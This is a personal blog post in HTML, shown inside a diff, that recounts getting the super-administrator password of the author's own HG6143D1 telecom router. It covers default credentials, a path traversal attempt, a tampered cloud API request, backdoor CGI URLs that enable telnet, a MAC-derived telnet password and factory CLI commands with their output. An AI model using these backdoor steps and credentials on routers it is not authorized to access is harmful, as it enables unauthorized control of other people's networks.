@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  
+    <link rel="alternate" hreflang="zh" href="/zh/2025/07/28/router/">
+  
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+  <!-- RSS / Atom -->
+  <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <title>现充|junyu33</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div class="head-nav">
+	<div class="inner">
+		<a href="/">
+			现充|junyu33
+		</a>
+		<div class="right">
+			
+				<a href="/">Home</a>
+				<a href="/archives">Archive</a>
+				
+					<a href="/categories">Categories</a>
+				
+				
+					<a href="/tags">Tags</a>
+				
+				<a href="/zh">中文站</a>
+			
+		</div>
+	</div>
+</div>
+
+  <div class="main">
+    <div class="post">
+    
+      <nav class="lang-switch" role="navigation" aria-label="Language switch">
+        
+          <a class="lang-pill"
+             href="/zh/2025/07/28/router/"
+             hreflang="zh">
+            <span class="lang-label">中文</span>
+          </a>
+        
+      </nav>
+    
+
+	<h1>Obtaining the super administrator password for the HG6143D1 router</h1>
+	<p>Because my under-18-year-old nephew was playing TikTok videos out loud too noisily and was addicted to online games, I decided to take some measures within my capabilities.</p>
+<p>For example, I attempted to edit the firewall settings of the telecom router to block access to the domain names associated with the games.</p>
+<p>I'll document the exploration process here, with the correct solution provided in the last section.</p>
+<span id="more"></span>
+<h2 id="Fake-Management-Interface">Fake Management Interface</h2>
+<p>I previously saw the username <code>useradmin</code> and password (a 5-letter all-alphabetic string) for the terminal management interface on the back of the router. Accessing <code>http://192.168.1.1</code> allowed me to log in. However, after browsing through all the router's settings:</p>
+<img src='https://img.junyu33.me/blog/router/image.png'>
+<p>I found that none of the settings were related to the router's firewall. The only somewhat useful function was the ability to change the Wi-Fi password. So, this management interface only serves to satisfy some users' vanity—its functionality is extremely limited.</p>
+<p>After searching the web (STFW), I learned that our login user <code>useradmin</code> is merely a standard user. To access the real &quot;management interface,&quot; you need to log in as the &quot;super administrator&quot; <code>telecomadmin</code> with the correct password. Thus, the next few sections delve into the long and arduous journey of finding the &quot;super administrator&quot; password.</p>
+<h2 id="Success-Method-0-Social-Savvy">Success Method 0: Social Savvy</h2>
+<p>Theoretically, the fastest method is—letting professionals handle professional tasks. Sending a red envelope (monetary gift) to the broadband technician or calling customer service might lead to success. For example:</p>
+<blockquote>
+<p>I just had IPTV set up a few days ago. I've been a long-time telecom user for over ten years, but they never replaced my earliest TV box. I contacted customer service about it, and the technician who came to install the box turned out to be my middle school classmate. We added each other on WeChat. During those days of troubleshooting, I tried all the online methods but nothing worked. I felt a bit awkward asking the technician since, although we knew each other, we weren't that close. I first tried a ¥10 service on Xianyu, but it was too late that day, so they said they'd check and send it the next day. However, they later told me their system was glitching and couldn't retrieve the info, so they refunded me and suggested I contact the broadband technician. I mustered the courage to ask my old classmate, and he readily looked it up for me. He warned me not to mess with the settings, saying that providing this info was technically against the rules. As soon as I got access, I deleted TR069, spent some time researching, set up single-wire multiplexing, enabled and fixed Telnet. Now all IPTV devices on my local network work, and the IPTV box functions normally. Feeling pretty pleased. 😌</p>
+<p>Okay-Alone: <a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av114002340354203/">https://www.bilibili.com/video/av114002340354203/</a></p>
+</blockquote>
+<p><s>But doing this would reveal my intention to tinker with the network, and my nephew would find out.</s></p>
+<h2 id="Failed-Method-1-Default-Password">Failed Method 1: Default Password</h2>
+<p>After ATFAI (Ask The F**king AI), I learned that as a telecom device, the default password for <code>telecomadmin</code> is <code>nE7jA%5m</code>. I tried it, but the password was incorrect.</p>
+<p>After another round of STFW, I found that the default password for the &quot;super administrator&quot; is indeed <code>nE7jA%5m</code>. However, after fiber optic internet activation, the password is reset to an 8-character string containing letters, numbers, and special characters. Even brute-forcing via packet capture would be impractical in terms of time cost. (Of course, you could choose to restore the router to factory settings and log in, <s>but then my nephew would find out</s>.)</p>
+<p>A quick search on Bilibili revealed many videos attempting to obtain the telecom broadband administrator password. I summarized three main types of solutions, as shown below:</p>
+<h2 id="Failed-Method-2-Path-Traversal">Failed Method 2: Path Traversal</h2>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Zu411m72m/">Video Link</a>.</p>
+<p>Students familiar with path traversal vulnerabilities know that we can use <code>..</code> to navigate to the parent directory. By repeating <code>../../../../</code> multiple times, we can eventually reach the root directory. Here's a real-world example:</p>
+<p>First, my router allows connecting a USB drive, and the web interface can access the contents of this drive. Therefore, we can pre-create a folder (e.g., <code>UMR</code>) on the USB drive and modify the frontend JavaScript function (e.g., <code>openfile('UMR', false)</code>) to <code>openfile('..', false)</code>. Theoretically, this should allow access to the parent directory of the folder. If successful, changing it to <code>openfile('../../../../', false)</code> would lead to the root directory, meaning you gain access to any path. The administrator password is stored in plaintext in a certain file—simply copy the entire system directory to the USB drive and search for it at your leisure.</p>
+<p>However, things didn't go as planned. In my case, after changing it to <code>openfile('..', false)</code>, the interface showed nothing. But when I changed it to <code>openfile('../../../path/to/usb', false)</code>, the contents of the USB drive reappeared. Therefore, I suspect the backend logic was rewritten to filter out any content outside the USB drive path—this vulnerability has been patched, and the method failed.</p>
+<h2 id="Failed-Method-3-App-Packet-Capture">Failed Method 3: App Packet Capture</h2>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av984644141/">Video Link</a></p>
+<p>The idea in this video is to download the official router app &quot;Xiao Yi Guan Jia,&quot; bind the router, enter the router management interface, and find the option to toggle the router indicator light. Then, start capturing packets, select a packet sent to the Tianyi server, modify its content to a JSON string attempting to query the administrator password, and resend it. In this way, the correct administrator password can be seen in the response.</p>
+<p>To set up the experimental environment, I used an old phone from four years ago that had been rooted and had the Xposed framework installed. I also installed the packet capture software Reqable on both the phone and the computer. We needed to install a CA certificate for HTTPS decryption on the Android phone (I used the method of installing an Xposed module for this) and pair the phone with the computer to facilitate operating the packet-sending commands from the computer. We captured several packets communicating with the server, such as:</p>
+<pre><code>POST /device/api?token=??????&amp;MAC=??????? HTTP/1.1
+Content-Type: application/json
+SDKVersion: 3.6.2
+phoneNum: ???????????
+phoneOS: Android
+systemVersion: 7.0
+AppKey: ???????????
+User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.0; STF-AL10 Build/HUAWEISTF-AL10)
+Host: nos10-2.189cube.com
+Connection: Keep-Alive
+Accept-Encoding: gzip
+Content-Length: 187
+
+&#123;&quot;InterfaceName&quot;:&quot;com.ctc.igd1.SleepTimer&quot;,&quot;ObjectPath&quot;:&quot;/com/ctc/igd1/Config/Power/SleepTimers&quot;,&quot;RPCMethod&quot;:&quot;GetProperitesOfSubObjects&quot;,&quot;SequenceId&quot;:&quot;31629&quot;,&quot;ServiceName&quot;:&quot;com.ctc.igd1&quot;&#125;
+</code></pre>
+<p>Following the online instructions, we modified the JSON string in the last line to:</p>
+<pre><code class="language-json">&#123;
+  &quot;Params&quot;: [],
+  &quot;MethodName&quot;: &quot;GetTAPasswd&quot;,
+  &quot;RPCMethod&quot;: &quot;CallMethod&quot;,
+  &quot;ObjectPath&quot;: &quot;/com/ctc/igd1/Telecom/System&quot;,
+  &quot;Interfacename&quot;: &quot;com.ctc.igd1.SysCmd&quot;,
+  &quot;ServiceName&quot;: &quot;com.ctc.igd1&quot;
+&#125;
+</code></pre>
+<p>As a result, we obtained the following outcome:</p>
+<img src='https://img.junyu33.me/blog/router/image-1.png'>
+<p>I attempted to modify some parameters in the request header and found that only the <code>token</code> and <code>MAC</code> in the POST parameters affected the output. Arbitrarily modifying the <code>token</code> resulted in an invalid token error, while modifying the <code>MAC</code> prompted that the device was not registered. Attempting to decode the <code>token</code> in hexadecimal also revealed nothing noteworthy—this suggests that the packet-sending vulnerability seems to have been patched, rendering this method unsuccessful.</p>
+<h2 id="Success-Method-1-Trying-the-Backdoor">Success Method 1: Trying the Backdoor</h2>
+<p>Through Bilibili videos and searching with the keyword <code>HG6143D1</code>, I attempted the following potential backdoor links (remember to disable your proxy):</p>
+<pre><code>http://192.168.1.1:8080/
+http://192.168.1.1:8080/cgi-bin/abcdidfope94e0934jiewru8ew414.cgi
+http://192.168.1.1:8080/cgi-bin/telnetenable.cgi?key=HG6143D1&amp;telnetenable=1
+http://192.168.1.1:8080/cgi-bin/telnetenable.cgi?telnetenable=1&amp;key=&lt;ONT MAC address without symbols&gt;
+</code></pre>
+<p>The first page remained blank and took a long time to load, the second and third returned 404 errors, and the last one displayed &quot;telnet enabled&quot;—finally a success. I then followed the <a target="_blank" rel="noopener" href="https://juejin.cn/post/7409828788126892041">tutorial</a> that provided the fourth link for the next steps:</p>
+<ol>
+<li>Enter WSL and type <code>telnet 192.168.1.1</code>, username <code>telnetadmin</code>, password <code>FH-nE7jA%5mXXXXXX</code>, where <code>XXXXXX</code> is replaced by the last six digits of the MAC address without colons.</li>
+<li>Enter factory mode by typing <code>load_cli factory</code>.</li>
+<li>The shell prompt changes from <code>$</code> to <code>#</code>. Type <code>show admin_pwd</code> to display the administrator password.</li>
+</ol>
+<p>My process looked like this:</p>
+<pre><code>junyu33@zjy-asus /m/c/U/j/Desktop&gt; telnet 192.168.1.1                                                            (base)
+Trying 192.168.1.1...
+Connected to 192.168.1.1.
+Escape character is '^]'.
+Login:telnetadmin
+Password:
+$load_cli factory
+cli main init.....argc=2 /r/n
+consoleFd = -1
+----cli_main_begin 488 -1
+cannot   open   (fh-bin)confile
+cl_run_memfile_config  unlocked success!
+Config\factorydir# show admin_pwd
+Success! admin_pwd=????????
+Config\factorydir# 
+</code></pre>
+<p>And just like that, I obtained the administrator password. I entered <code>http://192.168.1.1</code> in the browser, logged in with the super administrator username <code>telecomadmin</code> and the password to access the real (and rather ugly) management interface:</p>
+<img src='https://img.junyu33.me/blog/router/image-3.png'>
+<p>The rest was straightforward. I navigated to &quot;Security&quot; -&gt; &quot;URL Filtering,&quot; enabled it, and then used ATFAI to find the URLs for the games my nephew plays and the TikTok videos, adding them one by one.</p>
+<img src='https://img.junyu33.me/blog/router/image-4.png'>
+</div>
+
+
+  </div>
+</body>
+</html>
+
